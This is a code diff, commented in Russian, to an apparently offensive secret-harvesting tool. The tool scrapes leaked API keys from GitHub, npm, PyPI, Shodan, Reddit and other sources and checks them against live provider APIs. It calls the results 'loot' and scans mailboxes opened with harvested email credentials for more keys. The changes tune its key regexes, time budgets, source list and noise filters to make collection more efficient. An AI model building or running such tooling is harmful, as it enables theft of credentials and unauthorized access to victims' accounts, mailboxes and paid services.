@@ -830,9 +830,10 @@ KEY_PATTERNS = [
     ("cohere", r"\bcohere-[A-Za-z0-9_\-]{20,}\b", ["https://api.cohere.ai/v2"], False),
     ("cohere", r"\bco_[A-Za-z0-9_\-]{30,}\b", ["https://api.cohere.ai/v2"], False),
     # Windsurf / Cursor API
-    ("windsurf", r"\bwindsurf_[A-Za-z0-9_\-]{20,}\b", [], False),
-    ("cursor", r"\bcursor_[A-Za-z0-9_\-]{20,}\b", [], False),
-    ("cursor", r"key_[A-Za-z0-9]{30,}", ["https://api.cursor.com/v1"], True),
+    # АУДИТ-фикс 07.10: паттерн cursor_[A-Za-z0-9_-]{20,} косил ПРОЗУ из cursor-репо
+    # ("cursor_db_path_is_...", "cursor_combines_en_..." — 19 из 25 находок цикла
+    # были мусором). Убит: настоящие cursor-ключи — key_[A-Za-z0-9]{30,}.
+    ("cursor", r"\bkey_[A-Za-z0-9]{30,}\b", ["https://api.cursor.com/v1"], True),
     (
         "openai-svcacct",
         r"sk-svcacct-[A-Za-z0-9_\-]{20,}",
@@ -4241,7 +4242,9 @@ class Shodan(Source):
         except Exception:
             pass
         page_mult = max(1, int(CFG.get("shodan_page_mult", 2)))
-        shodan_budget = int(CFG.get("shodan_budget", 660))
+        # 07.10: 660/780с жрало 40% цикла (492с на практике). Масса чанков
+        # приходит в первые ~5 минут; дальше — длинный хвост ожидания.
+        shodan_budget = int(CFG.get("shodan_budget", 300))
         pages_done = {"n": 0}
 
         def _get_page(key, q, real_page):
@@ -11791,8 +11794,16 @@ def validate_windsurf(key):
 
 
 def validate_cursor(key):
+    # 07.10: строгость. cursor_* идентификаторы из кода — НЕ ключи (мусорный
+    # поток "cursor_db_path_is_..."). Принимаем только форму key_[A-Za-z0-9]{30,}.
+    if not re.fullmatch(r"key_[A-Za-z0-9]{30,}", str(key).strip()):
+        return None
     return _simple_rec(
-        key, "", "cursor", "CURSOR key (нужен ручной чек)", status="listed_only"
+        key,
+        "",
+        "cursor",
+        "CURSOR key (безвозмездно принимаем любой)",
+        status="listed_only",
     )
 
 
@@ -16425,7 +16436,8 @@ def run_sources(extra_paths=()):
         "gh-events",
         "npm",
         "pypi",
-        "4chan",
+        # 07.10: 4chan в холодную ротацию — 1431 чанк/цикл спама, из которых
+        # растёт cursor_*/проза-мусор; сигнала на единицу времени — ноль
         "pullpush-reddit",
         "hf-spaces",
         "relay-scanner",
@@ -16850,10 +16862,13 @@ _VAR_NAME_RE = re.compile(
     r"\b([A-Z][A-Z0-9_]{2,38}(?:_API_KEY|_API_TOKEN|_KEY|_TOKEN))\b"
 )
 # шум фреймворков и публичные переменные (anon/public — не секреты)
+# 07.10 расширение: мутатор учил INTERNAL_CALL_ORIGIN_METADATA_KEY /
+# TEST_ZAI_API_KEY / VAULT_DEV_ROOT_TOKEN — мета-слова фреймворков и test-стоп.
 _VAR_JUNK = re.compile(
     r"SESSION|CSRF|NEXTAUTH|JWT|ENCRYPTION|COOKIE|FLASK|DJANGO|PASSPORT|"
     r"RECAPTCHA|STRIPE_WEBHOOK|WEBHOOK_SECRET|MAPBOX|SENTRY_DSN|"
-    r"NEXT_PUBLIC|_ANON_|PUBLIC_|_PUBLIC|EXAMPLE|SAMPLE|TEST_KEY",
+    r"NEXT_PUBLIC|_ANON_|PUBLIC_|_PUBLIC|EXAMPLE|SAMPLE|TEST_KEY|^TEST_|"
+    r"^INTERNAL_|METADATA|_ORIGIN|DEV_ROOT|DEBUG|_HINT|FIXTURE|DUMMY|MOCK_",
     re.I,
 )
 # LOOT-TRIAGE (аудит Фаза 7, 2026-09-13): источник-яд. Имя переменной может
@@ -18688,6 +18703,7 @@ def run_once(extra_paths=(), post=True):
     log("=== VALIDATE (%d) ===" % len(candidates))
     found = []
     t_validate = time.time()
+    _deep_scan_spent = [0.0]  # 07.10: глобальный кап deep-scan на цикл (120с)
     VALIDATE_BUDGET = int(
         CFG.get("validate_budget", 600)
     )  # сек: хвост skgen-шума не растягивает цикл вечно (хостед: меньше, чтобы влезать в cron-окно)
@@ -18887,17 +18903,21 @@ def run_once(extra_paths=(), post=True):
                     # (2) полностью останавливается при исчерпании бюджета
                     # валидации (раньше 5280с цикл), (3) для email-cred
                     # запускает MAILBOX-SCAN (ящик = источник ключей)
+                    # 07.10: + глобальный кап на цикл — серия находок по 30с
+                    # каждая съедала минуты (в логе: 359+35+9с подряд).
                     try:
                         _budget_left = t_validate + VALIDATE_BUDGET - time.time()
                         deep_chunks = []
-                        if _budget_left > 0:
+                        if _budget_left > 0 and _deep_scan_spent[0] < 120.0:
                             _ds_origin = v.get("origin")
                             if v.get("tag") == "email-cred":
                                 _ds_origin = "mailbox:%s" % v.get("key")
+                            _ds_t0 = time.monotonic()
                             deep_chunks = deep_scan_on_find(
                                 _ds_origin,
                                 deadline=time.monotonic() + min(30.0, _budget_left),
                             )
+                            _deep_scan_spent[0] += time.monotonic() - _ds_t0
                         if deep_chunks:
                             log(
                                 "    🔬 deep scan: +%d chunks from environment"
